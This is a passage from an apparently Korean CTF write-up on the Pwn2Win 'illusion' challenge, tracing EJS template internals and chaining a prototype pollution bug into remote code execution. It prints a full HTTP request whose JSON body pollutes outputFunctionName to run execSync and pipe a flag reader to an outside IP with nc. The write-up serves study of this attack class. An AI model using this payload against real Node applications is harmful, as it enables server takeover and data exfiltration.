</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">exports</span>.<span style="color:#a6e22e">promiseImpl</span>(<span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">resolve</span>, <span style="color:#a6e22e">reject</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">result</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">handleCache</span>(<span style="color:#a6e22e">options</span>)(<span style="color:#a6e22e">data</span>);
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">resolve</span>(<span style="color:#a6e22e">result</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">err</span>) {
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">reject</span>(<span style="color:#a6e22e">err</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>      });
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> Error(<span style="color:#e6db74">&#39;Please provide a callback function&#39;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">result</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">handleCache</span>(<span style="color:#a6e22e">options</span>)(<span style="color:#a6e22e">data</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">err</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">cb</span>(<span style="color:#a6e22e">err</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">cb</span>(<span style="color:#66d9ef">null</span>, <span style="color:#a6e22e">result</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><code>tryHandleCache()</code> 메서드에서는 <code>handleCache()</code> 메서드를 호출하는 것을 볼 수 있다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">handleCache</span>(<span style="color:#a6e22e">options</span>, <span style="color:#a6e22e">template</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">func</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">filename</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">options</span>.<span style="color:#a6e22e">filename</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">hasTemplate</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">arguments</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">options</span>.<span style="color:#a6e22e">cache</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">filename</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> Error(<span style="color:#e6db74">&#39;cache option requires a filename&#39;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">func</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">exports</span>.<span style="color:#a6e22e">cache</span>.<span style="color:#a6e22e">get</span>(<span style="color:#a6e22e">filename</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">func</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">func</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">hasTemplate</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">template</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fileLoader</span>(<span style="color:#a6e22e">filename</span>).<span style="color:#a6e22e">toString</span>().<span style="color:#a6e22e">replace</span>(<span style="color:#a6e22e">_BOM</span>, <span style="color:#e6db74">&#39;&#39;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">hasTemplate</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// istanbul ignore if: should not happen at all
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">filename</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> Error(<span style="color:#e6db74">&#39;Internal EJS error: no file name or template &#39;</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;provided&#39;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">template</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fileLoader</span>(<span style="color:#a6e22e">filename</span>).<span style="color:#a6e22e">toString</span>().<span style="color:#a6e22e">replace</span>(<span style="color:#a6e22e">_BOM</span>, <span style="color:#e6db74">&#39;&#39;</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">func</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">exports</span>.<span style="color:#a6e22e">compile</span>(<span style="color:#a6e22e">template</span>, <span style="color:#a6e22e">options</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">options</span>.<span style="color:#a6e22e">cache</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exports</span>.<span style="color:#a6e22e">cache</span>.<span style="color:#a6e22e">set</span>(<span style="color:#a6e22e">filename</span>, <span style="color:#a6e22e">func</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">func</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><code>handleCache()</code> 메서드에서는 <code>export.compile()</code> 메서드를 또 호출한다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">exports</span>.<span style="color:#a6e22e">compile</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">compile</span>(<span style="color:#a6e22e">template</span>, <span style="color:#a6e22e">opts</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">templ</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// v1 compat
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// &#39;scope&#39; is &#39;context&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// FIXME: Remove this in a future version
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">opts</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">scope</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">scopeOptionWarned</span>){
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">warn</span>(<span style="color:#e6db74">&#39;`scope` option is deprecated and will be removed in EJS 3&#39;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">scopeOptionWarned</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">context</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">context</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">scope</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">delete</span> <span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">scope</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">templ</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Template</span>(<span style="color:#a6e22e">template</span>, <span style="color:#a6e22e">opts</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">templ</span>.<span style="color:#a6e22e">compile</span>();
</span></span><span style="display:flex;"><span>};
</span></span></code></pre></div><p><code>export.compile()</code> 메서드에서는 <code>Tempalte()</code>이라는 객체를 생성자를 이용해서 생성하고, 생성한 템플릿 객체로 <code>compile()</code> 메서드를 실행하는 것을 볼 수 있다. ejs 모듈 내부는 처음보는데 아마 이 <code>Template()</code> 객체가 웹 프론트 단에 출력되는 부분인 거 같다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>  <span style="color:#a6e22e">compile</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> () {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/** @type {string} */</span>
</span></span><span style="display:flex;"><span>    ...
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">source</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">generateSource</span>();
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">prepended</span> <span style="color:#f92672">+=</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;  var __output = &#34;&#34;;\n&#39;</span> <span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;  function __append(s) { if (s !== undefined &amp;&amp; s !== null) __output += s }\n&#39;</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">outputFunctionName</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">prepended</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;  var &#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">outputFunctionName</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; = __append;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\n&#39;</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    ...
</span></span></code></pre></div><p><code>compile()</code> 메서드를 확인 해보면 <code>outputFunctionName</code>을 이용해서 문자열을 만드는 것을 볼 수 있다. 즉, 우리는 <code>applyPatch()</code>에서 발생하는 <code>Prototype Pollution</code> 취약점을 이용해서 <code>compile()</code> 메서드에서 사용되는 <code>outputFunctionName</code> 값을 잘 조작해 문자열을 맞춰 RCE를 발생시켜야 한다.</p>
<pre tabindex="0"><code>POST /change_status HTTP/1.1
Host: illusion.pwn2win.party:44211
Cache-Control: max-age=0
Authorization: Basic YWRtaW46cXp0bG5mdXlzZXVxeWpmaQ==
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: _ga=GA1.2.687081227.1622238128; _gid=GA1.2.492571223.1622429990
Content-Type: application/json
Connection: close
Content-Length: 155

{
    &#34;constructor/prototype/outputFunctionName&#34;: &#34;_; process.mainModule.require(&#39;child_process&#39;).execSync(&#39;./readflag | nc 141.164.52.207 80&#39;);//&#34;
}
</code></pre><p>그래서 위와 같이 값을 보내 <code>Prototype Pollution</code>을 이용해서 <code>outputFunctionName</code>의 값을 <code>value</code> 값으로 오염을 시켜주었다.</p>
<p><img src="https://github.com/wjddnjs33/image/blob/main/prototype/flag.png?raw=true" alt=""></p>
<p>그리고 index 페이지로 접속을 하게 되면 <code>ejs.renderFile()</code> 메서드가 실행 될 때, 이미 <code>outputFunctionName</code>의 값이 js exploit code로 오염이 되어 있어 RCE가 발생해 플래그를 얻을 수 있었다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>FLAG : CTF-BR{d0nt_miX_pr0totyPe_pol1ution_w1th_a_t3mplat3_3ng1nE!}
</span></span></code></pre></div>
      </div></div>

  

  
    

  
</article>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright">
        <span>© 2025 Powered by <a href="https://gohugo.io">Hugo</a></span>
    
      <span>:: <a href="https://github.com/mirus-ua/hugo-theme-re-terminal" target="_blank">Theme</a> made by <a href="https://github.com/mirus-ua" target="_blank">Mirus</a></span>
      </div>
  </div>
</footer>






<script type="text/javascript" src="/bundle.min.js"></script>








  
</div>

</body>
</html>
